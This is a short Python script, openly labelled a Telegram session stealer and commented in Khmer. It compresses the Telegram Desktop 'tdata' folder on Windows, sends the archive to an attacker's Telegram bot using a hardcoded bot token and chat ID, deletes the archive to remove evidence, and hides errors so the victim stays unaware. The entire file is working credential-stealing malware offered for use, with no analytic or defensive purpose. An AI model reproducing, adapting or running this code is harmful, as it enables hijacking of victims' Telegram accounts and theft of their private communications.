import os
import shutil
import requests
import zipfile
from datetime import datetime

# --- UmbraAIBot Telegram Session Stealer ---
# កំណត់ព័ត៌មាន Bot របស់អ្នកនៅទីនេះ
BOT_TOKEN = "8976156814:AAFVrtYU3o5Cyk8MGH2GDLKBIbVzkc-SGQQ"
CHAT_ID = "7922122759"

# ផ្លូវទៅកាន់ Folder tdata របស់ Telegram Desktop (Windows)
tdata_path = os.path.expandvars(r'%AppData%\Telegram Desktop\tdata')
zip_name = "session_dump.zip"

def send_to_bot(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        payload = {'chat_id': CHAT_ID}
        files = {'document': file}
        requests.post(url, data=payload, files=files)

def steal_session():
    try:
        if os.path.exists(tdata_path):
            # បង្រួម Folder tdata ទាំងអស់ដើម្បីងាយស្រួលផ្ញើ
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        zipf.write(os.path.join(root, file), 
                                   os.path.relpath(os.path.join(root, file), 
                                   os.path.join(tdata_path, '..')))
            
            # ផ្ញើ File ដែលបង្រួមរួចទៅកាន់ Bot
            send_to_bot(zip_name)
            
            # លុប File សាក្សីចោល
            os.remove(zip_name)
    except Exception as e:
        pass # មិនបង្ហាញ Error ដើម្បីកុំឱ្យជនរងគ្រោះដឹង

if __name__ == "__main__":
    steal_session()
```
